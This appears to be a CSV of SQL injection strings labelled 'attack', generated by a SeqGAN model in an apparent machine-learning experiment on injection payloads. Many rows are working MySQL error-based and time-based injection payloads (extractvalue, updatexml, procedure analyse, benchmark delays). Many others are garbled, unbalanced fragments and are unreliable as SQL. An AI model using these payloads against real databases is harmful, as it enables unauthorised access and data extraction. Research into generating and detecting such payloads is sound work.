attack,"1 and extractvalue  (  (   (  )updatexml  (  (  (  (  (  (  7050  (  2917,concat  (  (  0x5c  (  (  0x5c,0x7171706a71,0x717a767a71  Y  (  (  9627,m5  (  9627,m(    (  (  select   (  elt  (  1297  =  (  m 0 a  (  (  elt  (  elt  (  3393  =  (  6166  =  (  1808,1   or extractvalue  (  (  0x2e,(  (  5000000(  =  3393,  (  benchmark   (  (  (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1089
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and """" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""xMN1161)    9338  )  select   (  5433  (  0x5c,0x7171706a71,  (  (  (  select   (  elt  (  elt  (  1808  =  (  (  0x2e,md5  (  0x2e,concat  (  (  0x2e,  (  benchmark  (  (  5000000,md5  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  (  0x2e,md5  (  0x5c,0x7171706a71,  (  (  5000000(  (  (  1808concat  (  0x5c,  (  (  0x5c,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1090
attack," and updatexml  (  (  2917,concat  (  (  0x5c,0x7171706a71,updatexml  (  (  (  9255,concat  (  (  (  (  (  3393  (  (  (  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  7982,md5  (   (  (  (  5000000,md5  (  (    (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  1808,concat  (  (  (  0x2e,  (  select   (  elt  (  elt  lt  (  8862  =  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1091
attack,"1%' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'ph' like 'khr""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1092
attack,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""c%'  =  'kj",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1093
attack,"1%""   )    )     extractvalue  (  9627,concat  (  0x2e,0x7171706a71,  (  (  (  (  (  (  benchmark  (  (  5000000,(  (  (  1297,concat  (  (  (  3393,1   (  5603   (  (  (  elt  (  1297  =  (  3393,1   from dual  )   end  (  (  elt  elt  (  7982  =  (  3393,md5  (  0x5c,0x7171706a71,  (  5000000(  (  0x2e,0x7171706a71,  (    (  7982  =  (  7982,md",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1094
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1095
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1096
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1097
attack,"1 and extractvalue  (  (  (  (  (  (  1808,concat  (  (  (  (  (  (  (  (  (  (  (  (  (  1297=  (  =  (  (  (  7982,concat  (  (  (  0x2e(  5000000(  (  select   (  elt  (  elt  (  0x5c,0x7171706a71,  (  select   (  (  case when   (  5847  (  (  case when   (  5433  (  (  case  =  (  (  3393,concat  (  (  (  (  0x2e,  (  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1098
attack,"1%""   )    )    AND 4102  =  7757  =  1 extractvalue  (  (  (  (  (  2518  (   (  ual   (    (  e  5704  (  0x2e,0x7171706a71(  (  5000000,md5  (  (  0x2e,0x7171706a71,  8868  (  select   (  elt  (  ~t  (  7982  =  (  (  9255,concat  (  (  (  1759  (  (  0x2e,md5  (  (  0x2e,md5  (  (  0x5c,0x7171706a71,0x7171706a71,  (  select   (  3393,1   )    (  extractvalue  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1099
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1100
attack,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1101
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  'ks      0x717a767a715423  (  (  1759,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  case  =  (  0x2e,0x7171706a71,  (  5000000(  (  0x5c,0x717a767a71  (  select   (  (  elt  (  1297  =  3393,  (  (  5000000,md5  (  0x5c,md5  (  0x5c,0x7171706a71,  (  (  =  (  (  9627,concat  (  (  0x2e,md5(  0x5c,0x7171706a71,  (  (  select   (  elt  (  1297  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1102
attack,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1103
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1104
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '' like 'ynh",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1105
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1106
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1107
attack,"1%""   )    )     (  extractvalue  (  (  (  (  5000000,md5  (  (  (  (  (  0x2e,mduan0x4b774c75   end  5777  (  7982,1   )    )    AND COT(  extractvalue  (  =  (  a  1724  (  select   (  elt  (  elt  (  7982  =  (  (  select   (  elt  (  1808  =  (  3393,1   )    )extractvalue  (  (  7982,1   )    (  select   (  (  elt  (  eltal  9788",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1108
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1109
attack,"exx  (  (  (  9788 extractvalue  (  (  9627,concat  (  (  (  (  (  select   (  a d anal  )  )   end  (  (  5603  )  (  e  (  elt  (  0x4b774c75   (  6200  (  7982,1   )    (  9627,md5  (  select   (  (  eltl  )  0x2e,0x7171706a71,  (  benchmark  (  (  select   (  elt  (  elt  (   from d5  (  (  0x5c,0x7171706a71,  (  t  (  (  5000000",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1110
attack,"1%"" and extractvalue  (  (  (  (  (  (  (  1808  =  (  (  (  0x2e,0x7171706a71,(  (  select   (l  (  7982  =  (  (  1808  =  (  (  0x5c,md5  (  select   (  elt  (  elt  (  1808  =  3393,1   (  (  elt  (  7982  =  7982,0x7171706a71,  (  select   (  (  elt  elt  (  e  (  0x2e,md5  (  1 as d anal  )  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1111
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1112
attack," AND 1 where updatexml  (  (  (  (  3393,concat  (  (  0x2e,0x7171706a71,  (  (  =  (  (  8862,1   )    )  (  select   (  case when   (  5433  (  (  (  1808  =  (  3393,  (  =  (  9255,concat  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  0x5c,0x7171706a71,  (  (  benchmark  (  1808,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  (  benchmark  (  5000000,md",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1113
attack,"1%1%""   )    proceieanalyse    (na  (  0x4b774c75   end  (  (  elt  l    =  (  1808,1   )    USR$   uL  u wone   u d5  (  el  e  (  select   (  elt  (  3576  =  3393,  (   (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  0x5c,0x7171706a71,  (  select   (  case 0 1812    (  elt  (  9788  =  (  1759  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1114
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1115
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1116
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1117
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%ppc",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1118
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1119
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1120
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1121
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1122
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1123
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1124
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1125
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1126
attack,"1%""   )    (  2518  (   from dual  el  )  e  =  (  (  0x5c,0x7171706a71,  (  select   (  el  (  (  0x2e,md5  (  1808  =  (  (t  (  0x5c,  (  (  (  select   (  elt  (  3393  =  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  0x5c,0x7171706a71,  (  benchmark  (  benchmark  (  (  5000000,mdd5  (  0x5c,  (  0x5c,0x7171706a71,  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1127
attack,"1%""  )   or extractvalue  (  (  1808,concat  (  =  (  (  (  1808,1   )    (  extractvalue  (  9627,concat  (  (  (  (  0x5c,0x7171706a71,0x7171706a71,  (  (  (  select   (  elt  (   (  5423  (  (  elt  (  5000000,md5  (  0x5c,  (  (  benchmark  (  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  (  select   (  elt  )  0x2e,0x7171706a71,  (  select   (  elt  (  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1128
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1129
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1130
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1131
attack," 7997  (  select   (  elt  7982  =  (    (  0x5c,  (  (  (  benchmark  (  (  select   (  (  elt   (  5464  =  5777  (  1297,md5  (  0x2e,  (  benchmark  (  (  benchmark  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  )  0x52515a50   end  (  6134  (  (  (  elt  (  0x5c,0x7171706a71(  (  5000000,md5  (  (  select   (  elt  (  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1132
attack,"1%""   procedure anal  )  )  )   (  updatexml  (  (  (  (  (  0x5c,  (  (  (  select   (  (  elt  (  e  (  5000000(  (  0x5c,  (  benchmark  (  (  benchmark  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  0x2e,0x7171706a71,  (  (  select   (  elt  0x2e,0x7171706a71,  (  benchmark  (  9788,md5  (  0x2e,md5  (  (  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1133
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1134
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1135
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1136
attack,"1%""     )    )     )    AND fgetq   )  extractvalue  (  9627,concat  (  (  t  (  3393  (  0x5c,(  (  benchmark  (  (  5000000(  (  t  (  e  (  0x5c,1   and  (  select 9490 0 extractvalue  (  (  (  (  (  1297,concat  (  (  0x2e,  =  9255,1   (  4066  )  (  select case 0 from dual  )  )  e  )   (  5603  =  5433  (  elt  (  0x5c,  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1137
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1138
attack,"1%""   )    (  extractvalue  (  9627,concat  (  (  1808,concat  (  (  =  (  0x2e,md5  (  0x52515a50   (  6581  (  (  0x5c,  (  (  0x5c,0x7171706a71,  (  select   (  7744  )   (  (  2917,  (  (  0x5c,0x7171706a71,  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  1808  =  (  0x2e,0x7171706a71,  (  (  (  5000000,m(  (  (  9627,concat  (  (  0x5c,0x7171706a71,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1139
attack,"n1%""   where 9338  =  1 extractvalue  (  (  (  (  3393,concat  (  =  (  (  =  (  3393,1   )    (  extractvalue  (  (  9627,concat  (  select   (  )  el  (  2917  =  (  (  (  0x4b774c75   (  1724  (  79821543  )  (  (  0x2e,1   (  extractvalue  (  benchmark  (  (   SELECT dual  )  )  e  )  )  select 0 from duame  (  (  el  elt  (  (  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1140
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1141
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1142
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1143
attack,"1%1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1144
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1145
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1146
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1147
attack,"1%1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1148
attack," or updatexml  (  (  (  (  (  (  (  0x2e,0x7171706a71,  (  5000000(  (  (  (  (  (  extractvalue  =   (  extractvalue  (  9627,concat  (  (  0x5c,  (  (  select   (  (   (  2826  (  elt  (  0x2e,0x7171706a71,  (  select   (  elt  (  7982  =  (  (  1808  =  (  7982,  (  0x2e,0x7171706a71,  (  5000000(  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000(  (  (  0x2e,0x7171706a71,  (  select   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1149
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1150
attack,"1%""   )    )    ANDtl  =  6369  )  extractvalue  (  (  (  (  (  =  (   (  (  5433  ua   (  6166  (  (  1297  =  (  9627,concat  (  (  (    (  (  0x2e,0x7171706a71,  (  select   (  =  ut  elte  e  (  1297  =  (  (  9255,md5  (  (  0x2e,md5  (  (  0x2e,md5  (  (  0x5c,  (  (  5000000,md5  (  select   (   0 0 from",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1151
attack,"1 and extractvalue  (  (  (  8862  (  (  0x4b774c75   (  (  elt  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  efrom d5  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  7982  =  (  0x2e,0x7171706a71,  (  (  select   (  elnt  (  1297  =  3393,1O,0x717a767a71  (  select 1812re  (  3393,1   )    )    AND 'i'  extractvalue  (  (  (  (  (  0x2e,0x7171706a71,  (  select   (  el",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1152
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1153
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1154
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1155
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1156
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1157
attack,1%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1158
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1159
attack,"1%""   )    )    AND AND or  extractvalue  (  (  (  benchmark  (  (  (  1297,concat  (  (  (  (  6212  =  (  4688  7706  3393,concat  (  (  (  (  2917=  (  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  5000000(  (  0x2e,0x7171706a71,0x7171706a71,  (  (  t  (  benchmark  5000000(  (  7982  =  2518  (  9627,concat  (  (  (  select   (  elt  (  0x4b774c75   )    (  g  (  (  benchmark  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1160
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1161
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1162
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1163
attack,"1%""   )    (  extractvalue  (  (  (  9627,(  (  (  (  =  (  (  1759(  (  (  (  0x2e,0x7171706a716200  =  .1'a  )   proce analanaddr   e anal  )  )  )   end  (  (  case when   (  2501  (  3863  (  (  1297  =  (  3393,concat  (  (  select   (  0x5c9393  )   (  updatexml  (  (  3393,1   (  extractvalue  (  3393,1   )    5  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1164
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1165
attack,"select   )    AND d else    dual  )  )   SELECT 'i'  )  1  (  u in  (  (  0x2e,0x7171706a71,  (  (  (  select   (  el  (  0x2e,md5  0x4b774c75   )    (  select   (  8375  =  (  7982,1   )    (  7757  =  extractvalue  (  (  2518  (  9627,concat  (    (  (  9393  (  (  0x5c,  (  0x52515a50   (  case when   (  2518  (  5000000(  (  1808  (  (  1808,md5  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1166
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""x' like '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1167
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1168
attack,"1808,mxYt  (   (  (     (  (  5847  =  5847  (  (  5000000,md5  (  (  1 a  rt  )  1297  =  (  7982,0  (  select   (  elt  (  e  0x4b774c75   (  5847  (  benchmark  (  5000000(  (  0x5c,0x7171706a71,  (  t  (  benchmark  (  =  (  5000000,md5  (  (  select   (  (  elt  (  elt  (  9788  =  (  0x2e,0x7171706a71,  (  select   (  case when   (  4415 ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1169
